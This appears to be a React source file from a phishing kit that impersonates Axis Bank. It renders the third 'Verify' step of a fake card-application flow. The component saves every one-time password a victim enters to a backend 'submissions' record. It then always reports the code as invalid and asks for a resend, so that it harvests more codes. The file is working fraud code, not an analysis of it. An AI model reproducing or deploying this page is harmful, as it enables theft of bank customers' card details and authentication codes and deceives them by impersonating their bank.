import { Link } from "react-router";
import { useState, useRef, useEffect } from "react";
import { trpc } from "@/providers/trpc";
import { ArrowLeft, Shield, AlertCircle } from "lucide-react";

export default function Verify() {
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [error, setError] = useState(false);
  const [timer, setTimer] = useState(175);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const updateOtpMutation = trpc.submissions.updateOtp.useMutation();
  const { data: latestSubmission } = trpc.submissions.getLatest.useQuery();

  useEffect(() => {
    const interval = setInterval(() => {
      setTimer((prev) => {
        if (prev <= 1) {
          clearInterval(interval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    setError(false);
    const newOtp = [...otp];
    newOtp[index] = value.slice(-1);
    setOtp(newOtp);

    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    if (!pasted) return;
    setError(false);
    const newOtp = [...otp];
    pasted.split("").forEach((digit, i) => {
      if (i < 6) newOtp[i] = digit;
    });
    setOtp(newOtp);
    inputRefs.current[Math.min(pasted.length, 5)]?.focus();
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const otpValue = otp.join("");
    if (otpValue.length !== 6) return;

    if (latestSubmission?.id) {
      updateOtpMutation.mutate({
        id: latestSubmission.id,
        otp: otpValue,
        otpStatus: "Invalid",
      });
    }

    setError(true);
    setOtp(["", "", "", "", "", ""]);
    inputRefs.current[0]?.focus();
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-[#96144c] px-4 sm:px-6 py-4 flex items-center justify-between shadow-md">
        <Link to="/" className="text-white text-xl font-bold tracking-wider">
          AXIS BANK
        </Link>
        <Link
          to="/block"
          className="flex items-center gap-2 bg-white text-[#96144c] px-4 py-2 rounded-lg font-semibold text-sm hover:bg-white/90 transition-all"
        >
          <ArrowLeft size={16} /> Back
        </Link>
      </header>

      <div className="max-w-xl mx-auto px-4 py-8 sm:py-12">
        {/* Progress */}
        <div className="flex items-center justify-center gap-2 mb-8">
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-green-500 text-white rounded-full flex items-center justify-center text-sm font-bold">
              <Shield size={14} />
            </div>
            <span className="text-sm font-semibold text-green-600">Apply</span>
          </div>
          <div className="w-12 h-0.5 bg-green-500" />
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-green-500 text-white rounded-full flex items-center justify-center text-sm font-bold">
              <Shield size={14} />
            </div>
            <span className="text-sm font-semibold text-green-600">Card Details</span>
          </div>
          <div className="w-12 h-0.5 bg-[#96144c]" />
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-[#96144c] text-white rounded-full flex items-center justify-center text-sm font-bold">
              3
            </div>
            <span className="text-sm font-semibold text-[#96144c]">Verify</span>
          </div>
        </div>

        <div className="bg-white rounded-2xl shadow-lg overflow-hidden">
          <div className="bg-[#96144c] px-6 py-4">
            <h2 className="text-white text-center text-lg font-semibold">
              Enter the 6-digit code to continue
            </h2>
          </div>

          <form onSubmit={handleSubmit} className="p-6 sm:p-8">
            <div className="mb-6">
              <label className="block text-sm font-semibold text-gray-600 mb-4 text-center">
                Enter 6-digit code
              </label>
              <div className="flex justify-center gap-2 sm:gap-3">
                {otp.map((digit, i) => (
                  <input
                    key={i}
                    ref={(el) => { inputRefs.current[i] = el; }}
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleChange(i, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(i, e)}
                    onPaste={i === 0 ? handlePaste : undefined}
                    className={`w-12 h-14 sm:w-14 sm:h-16 text-center text-xl font-bold border-2 rounded-lg outline-none transition-all ${
                      error
                        ? "border-red-400 bg-red-50"
                        : digit
                        ? "border-[#96144c] bg-[#96144c]/5"
                        : "border-gray-200 focus:border-[#96144c] focus:ring-2 focus:ring-[#96144c]/10"
                    }`}
                  />
                ))}
              </div>
            </div>

            {error && (
              <div className="flex items-center justify-center gap-2 bg-red-50 border border-red-200 text-red-600 px-4 py-3 rounded-lg mb-4 text-sm font-medium">
                <AlertCircle size={16} />
                Invalid OTP. Please resend and try again.
              </div>
            )}

            <div className="text-center text-sm text-gray-400 mb-6">
              {timer > 0 ? (
                <span>
                  Resend code in{" "}
                  <span className="text-[#96144c] font-semibold">{timer}s</span>
                </span>
              ) : (
                <button
                  type="button"
                  onClick={() => setTimer(175)}
                  className="text-[#96144c] font-semibold hover:underline"
                >
                  Resend Code
                </button>
              )}
            </div>

            <div className="grid grid-cols-2 gap-3">
              <Link
                to="/block"
                className="flex items-center justify-center gap-2 border-2 border-gray-300 text-gray-600 py-3 rounded-xl font-semibold hover:bg-gray-50 transition-all"
              >
                <ArrowLeft size={16} /> Back
              </Link>
              <button
                type="submit"
                className="bg-[#96144c] text-white py-3 rounded-xl font-bold hover:shadow-lg hover:-translate-y-0.5 transition-all disabled:opacity-50"
                disabled={otp.join("").length !== 6}
              >
                Verify
              </button>
            </div>
          </form>
        </div>
      </div>

      <footer className="bg-gray-900 text-white text-center py-4">
        <p className="text-sm opacity-60">&copy; 2026 Axis Bank Ltd. All rights reserved.</p>
      </footer>
    </div>
  );
}
